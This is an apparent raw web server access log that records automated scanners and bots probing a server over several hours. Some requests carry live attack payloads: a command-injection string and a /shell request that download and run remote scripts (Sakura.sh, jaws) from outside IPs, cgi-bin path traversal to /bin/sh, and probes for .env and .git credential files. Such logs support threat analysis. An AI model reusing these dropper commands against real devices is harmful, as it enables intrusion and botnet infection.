13.86.117.139 - - [07/Nov/2025:16:43:30 +0000] "MGLNDD_175.202.19.10_443" 400 157 "-" "-" "-"
204.76.203.212 - - [07/Nov/2025:16:45:45 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
87.121.84.80 - - [07/Nov/2025:16:49:47 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
87.121.84.80 - - [07/Nov/2025:16:49:48 +0000] "POST /cgi-bin/login HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
124.156.179.141 - - [07/Nov/2025:16:51:59 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
204.76.203.219 - - [07/Nov/2025:17:18:59 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
36.94.100.202 - - [07/Nov/2025:17:35:58 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "-"
20.102.117.125 - - [07/Nov/2025:17:46:46 +0000] "GET /actuator/health HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
68.183.48.248 - - [07/Nov/2025:17:57:42 +0000] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
68.183.48.248 - - [07/Nov/2025:17:57:43 +0000] "GET /t4 HTTP/1.1" 400 255 "-" "Mozilla/5.0" "-"
68.183.48.248 - - [07/Nov/2025:17:57:44 +0000] "GET /favicon.ico HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36" "-"
213.209.157.24 - - [07/Nov/2025:17:57:48 +0000] "GET /.git/credentials HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Linux; Android 9; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.80 Mobile Safari/537.36" "-"
35.187.114.229 - - [07/Nov/2025:18:01:02 +0000] "GET / HTTP/1.1" 403 153 "-" "python-requests/2.32.5" "-"
164.92.188.144 - - [07/Nov/2025:18:07:13 +0000] "GET /.env HTTP/1.1" 400 255 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);" "-"
164.92.188.144 - - [07/Nov/2025:18:07:14 +0000] "GET /.git/config HTTP/1.1" 400 255 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);" "-"
23.132.164.172 - - [07/Nov/2025:18:13:15 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
23.132.164.172 - - [07/Nov/2025:18:13:16 +0000] "POST / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
23.132.164.172 - - [07/Nov/2025:18:13:18 +0000] "GET /.env HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
23.132.164.172 - - [07/Nov/2025:18:13:19 +0000] "POST / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
47.121.210.129 - - [07/Nov/2025:18:19:49 +0000] "GET /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=uname%20-a;cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F146.103.53.43%2FSakura.sh%3B+chmod+777+%2A%3B+sh+Sakura.sh%3B+rm+-rf+%2A.sh%3B+history+-c HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" "-"
40.124.114.161 - - [07/Nov/2025:18:24:59 +0000] "GET /manager/text/list HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
91.232.238.112 - - [07/Nov/2025:18:36:08 +0000] "GET / HTTP/1.0" 400 255 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
45.156.129.132 - - [07/Nov/2025:18:37:17 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
91.232.238.112 - - [07/Nov/2025:18:41:21 +0000] "GET / HTTP/1.0" 403 153 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
170.64.158.6 - - [07/Nov/2025:19:00:17 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:19:00:18 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
34.52.219.24 - - [07/Nov/2025:19:01:33 +0000] "GET / HTTP/1.1" 403 153 "-" "python-requests/2.32.5" "-"
176.65.149.253 - - [07/Nov/2025:19:11:09 +0000] "GET /.env HTTP/1.0" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" "-"
185.242.226.114 - - [07/Nov/2025:19:20:40 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
204.76.203.219 - - [07/Nov/2025:19:27:29 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
85.11.167.4 - - [07/Nov/2025:19:33:26 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:19:41:35 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:19:41:35 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
204.76.203.25 - - [07/Nov/2025:19:42:47 +0000] "GET /.gitignore HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3" "-"
192.227.196.186 - - [07/Nov/2025:19:45:55 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0" "-"
103.203.59.3 - - [07/Nov/2025:19:48:00 +0000] "GET / HTTP/1.1" 403 153 "-" "HTTP Banner Detection (https://security.ipip.net)" "-"
204.76.203.212 - - [07/Nov/2025:19:50:52 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
185.242.226.114 - - [07/Nov/2025:20:37:04 +0000] "\x16\x03\x01\x00\x8B\x01\x00\x00\x87\x03\x03(o\xB6\xC3\xD0\x10x\xB1\xBC!\xA2\xDD\xD2\xAB%\xC4\x1D\x124\xF3=\xE4\x00\x15k\x1F\xA2\x1A\x93I]c\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
157.230.89.234 - - [07/Nov/2025:20:38:26 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
170.64.158.6 - - [07/Nov/2025:20:57:07 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:20:57:08 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.137.234.71 - - [07/Nov/2025:21:01:06 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "-"
185.137.234.71 - - [07/Nov/2025:21:01:07 +0000] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 404 153 "http://175.202.19.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "-"
185.137.234.71 - - [07/Nov/2025:21:01:07 +0000] "GET /HNAP1/ HTTP/1.1" 404 153 "http://175.202.19.10/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1" "-"
204.76.203.219 - - [07/Nov/2025:21:27:55 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
213.209.157.254 - - [07/Nov/2025:21:50:16 +0000] "GET /.git/HEAD HTTP/1.1" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0 Iceweasel/19.0.2" "-"
147.185.132.31 - - [07/Nov/2025:21:57:17 +0000] "GET / HTTP/1.1" 403 153 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
170.64.158.6 - - [07/Nov/2025:22:02:20 +0000] "GET /.git/config HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
170.64.158.6 - - [07/Nov/2025:22:02:21 +0000] "GET /.git/config HTTP/1.1" 403 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
51.158.205.47 - - [07/Nov/2025:22:15:42 +0000] "GET / HTTP/1.0" 403 153 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)" "-"
204.76.203.212 - - [07/Nov/2025:22:59:11 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
152.67.60.131 - - [07/Nov/2025:23:06:57 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
164.92.178.248 - - [07/Nov/2025:23:13:52 +0000] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03H\xF4l!\x84\xE6|o\xF5e\xEDN\x89\xC60s\xC0P\xDE\x1CJ>J\x87\xF0q\x9F_8\x05\xB89 \x8A\xA7\x5C7\x0F-\xD2\xA4\x06\x83\x8D\xA2\x83s\x07\xA1\xE8\x8C\x84\x8E\x06\x89\xB8\xDB\xA2\xADa\xEB@\xF8\xBB\xBE\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-" "-"
135.237.126.199 - - [07/Nov/2025:23:19:29 +0000] "GET /manager/text/list HTTP/1.1" 400 255 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.219 - - [07/Nov/2025:23:33:45 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
162.216.150.182 - - [07/Nov/2025:23:37:58 +0000] "GET / HTTP/1.1" 403 153 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity" "-"
194.164.107.5 - - [07/Nov/2025:23:48:24 +0000] "\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03\x10\xA2X\x09\x7F\xC4\x03\xFB0e{\xD3\x0F\x12oe%\xA7u^\x94\x80@\xCE\xB4\xADtB\xF9\x9F\xF0\xF1 \xF6\x98\xEF\x1F\xBC%6\x1B\x17" 400 157 "-" "-" "-"
194.164.107.5 - - [08/Nov/2025:00:05:35 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "-"
194.164.107.5 - - [08/Nov/2025:00:06:27 +0000] "GET /favicon.ico HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36" "-"
216.180.246.198 - - [08/Nov/2025:00:07:16 +0000] "GET / HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:07:30 +0000] "GET / HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:07:53 +0000] "GET /manage/account/login HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:03 +0000] "GET /admin/index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:14 +0000] "GET /admin/index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:26 +0000] "GET /index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:36 +0000] "GET /index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:47 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:08:57 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:09:09 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:09:21 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:09:36 +0000] "GET /login.htm HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:09:46 +0000] "GET /login.htm HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:09:54 +0000] "GET /login.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:10:05 +0000] "GET /login.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:10:19 +0000] "GET /login.jsp HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:10:28 +0000] "GET /login.jsp HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:10:44 +0000] "GET /login HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:10:50 +0000] "GET /login HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:02 +0000] "GET /doc/index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:16 +0000] "GET /doc/index.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:22 +0000] "GET /remote/login HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:33 +0000] "GET /remote/login HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:44 +0000] "GET //admin/login.asp HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:11:55 +0000] "GET //admin/login.asp HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:12:07 +0000] "GET /web/ HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
152.32.204.21 - - [08/Nov/2025:00:12:15 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0" "-"
216.180.246.198 - - [08/Nov/2025:00:12:18 +0000] "GET /web/ HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
216.180.246.198 - - [08/Nov/2025:00:12:29 +0000] "GET //webpages/login.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
152.32.204.21 - - [08/Nov/2025:00:12:33 +0000] "GET /favicon.ico HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
152.32.204.21 - - [08/Nov/2025:00:12:33 +0000] "GET /robots.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
152.32.204.21 - - [08/Nov/2025:00:12:33 +0000] "GET /sitemap.xml HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11" "-"
216.180.246.198 - - [08/Nov/2025:00:12:40 +0000] "GET //webpages/login.html HTTP/1.1" 403 153 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'" "-"
167.94.146.50 - - [08/Nov/2025:00:13:52 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.50 - - [08/Nov/2025:00:13:53 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
167.94.146.50 - - [08/Nov/2025:00:13:56 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x9E\xB0h:J\x15\x09\x8E:\xD8\xC1=F\xD7w\xE31x\x04\xC8\x19Q#\x18\xC7\x15\xE3zl\x99P\xC8 &\xCD8\xC2\xC4\xEA6\xC0/\xA1\xFD\xEE\x17V\x01%q\x10\x92\x0F\xEAa@\x7F\x1B\x08\x9F\x05\xE6\xFB4\xA9\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
167.94.146.50 - - [08/Nov/2025:00:13:57 +0000] "GET /security.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.50 - - [08/Nov/2025:00:14:01 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03L}\x19,Q\x92T\x80\x8E\xCAa\xB7?\xEFq\xC9\x86\xE2\x1E" 400 157 "-" "-" "-"
43.251.17.236 - - [08/Nov/2025:00:25:19 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-" "-"
8.222.190.223 - - [08/Nov/2025:00:47:55 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+196.251.86.86/jaws;sh+/tmp/jaws HTTP/1.1" 404 153 "-" "Hello, world" "-"
87.121.84.80 - - [08/Nov/2025:00:48:20 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
87.121.84.80 - - [08/Nov/2025:00:48:21 +0000] "POST /cgi-bin/login HTTP/1.0" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" "-"
48.214.144.191 - - [08/Nov/2025:01:02:01 +0000] "GET / HTTP/1.1" 403 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
18.212.242.29 - - [08/Nov/2025:01:04:09 +0000] "GET /favicon.ico HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
3.89.255.246 - - [08/Nov/2025:01:04:56 +0000] "GET /robots.txt HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
44.203.183.27 - - [08/Nov/2025:01:05:00 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
100.27.201.47 - - [08/Nov/2025:01:11:31 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
172.202.118.119 - - [08/Nov/2025:01:18:02 +0000] "GET /druid/index.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
204.76.203.219 - - [08/Nov/2025:01:28:55 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
8.211.52.6 - - [08/Nov/2025:01:52:40 +0000] "GET / HTTP/1.1" 403 153 "-" "curl/7.64.1" "-"
123.160.223.72 - - [08/Nov/2025:01:53:24 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" "-"
93.174.93.12 - - [08/Nov/2025:02:06:32 +0000] "GET / HTTP/1.0" 403 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" "-"
204.76.203.212 - - [08/Nov/2025:02:16:44 +0000] "GET / HTTP/1.1" 403 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
